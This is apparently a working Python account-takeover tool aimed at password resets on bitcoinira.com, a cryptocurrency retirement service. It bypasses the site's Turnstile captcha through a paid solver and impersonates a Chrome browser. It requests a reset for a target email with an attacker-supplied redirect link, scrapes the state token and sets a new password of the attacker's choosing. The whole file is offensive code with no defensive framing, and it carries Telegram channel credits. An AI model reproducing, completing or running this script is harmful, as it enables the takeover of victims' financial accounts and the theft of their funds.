# t.me/schizodev - t.me/palantir7
import capsolver
from curl_cffi.requests import AsyncSession
from concurrent.futures import ThreadPoolExecutor
import asyncio
import json
from bs4 import BeautifulSoup

class Reset:
    def __init__(self):
        self.PASSWORD_REQUEST_URL = "https://api2.bitcoinira.com/api/v3/auth/reset-password-v2"
        self.PASSWORD_RESET_URL = "https://app.bitcoinira.com/recover/verify"
        self.MAX_RETRIES_CAPSOLVER = 5

        self.config = self.read_config()

        self.capsolver = capsolver
        self.capsolver.api_key = self.config['capsolver_key']

        self.password = self.config['password']
        self.url = self.config['url']
        self.target = self.config['target']

    def read_config(self):
        with open('config.json', 'r') as file:
            return json.load(file)

    def get_captcha_key(self):
        current_retries = 0
        while current_retries < self.MAX_RETRIES_CAPSOLVER:
            current_retries += 1

            try:
                solution = self.capsolver.solve({
                "type":"AntiTurnstileTaskProxyLess",
                "websiteKey":"0x4AAAAAAASBQAk2bPByDmIv",
                "websiteURL":"https://app.bitcoinira.com/forgot-password",
                })

                if type(solution) == dict and 'token' in solution.keys():
                    return solution
                
                return False
            except Exception as e:
                print(f"SOLVING CAPTCHA: {e}")
                return False

        return False

    async def run_captcha_task(self):
        loop = asyncio.get_running_loop()
        with ThreadPoolExecutor() as pool:
            get_captcha_key = await loop.run_in_executor(pool, self.get_captcha_key)
            return get_captcha_key

    async def send_request(self, url, method, session=AsyncSession(), payload=None, headers=None, proxy=None):        
        try:
            if proxy:
                session.proxies = proxy
            if method == "GET":
                response = await session.get(url, data=payload, headers=headers, impersonate="chrome")
            elif method == "POST":
                response = await session.post(url, data=payload, headers=headers, impersonate="chrome")

            return response, session
        except Exception as e:
            await print(f"SEND REQUEST: {e}")
            return False, session

    async def send_password_request(self, email):
        captcha = await self.run_captcha_task()
        if not captcha:
            return

        session = AsyncSession()
        body = {
            "cf-turnstile-response": captcha['token'],
            "email": email,
            "redirectLink": self.url
        }

        headers = {"userAgent": captcha['userAgent']}

        response, _ = await self.send_request(
            url=self.PASSWORD_REQUEST_URL,
            method="POST",
            payload=body,
            headers=headers
        )

        text = response.text

        if text == 'success':
            return True
        else:
            return False

        print(f"succesfully sent password reset link to: {self.target}")

    async def get_state_token(self, url):
        response, _ = await self.send_request(url=url, method="GET")
        try:
            soup = BeautifulSoup(response.text, "html.parser")
            state_token = soup.find("input", {"name": "stateToken"})
            return state_token['value']
        except Exception as e:
            print(f"STATE TOKEN: {e}")
            return False
        return False

    async def change_password(self, token):
        url = self.PASSWORD_RESET_URL + token
        state_token = await self.get_state_token(url)
        if not state_token:
            return False

        password = "F9J#0cvmD)12!h_S"
        payload = {
            "stateToken": state_token,
            "newPassword": self.password
        }

        response, _ = await self.send_request(url=url, method="POST", payload=payload)
        
        if response.status_code != 200:
            return False

        print(f"reset target: {self.target} with password: {self.password}")

# t.me/schizodev - t.me/palantir7
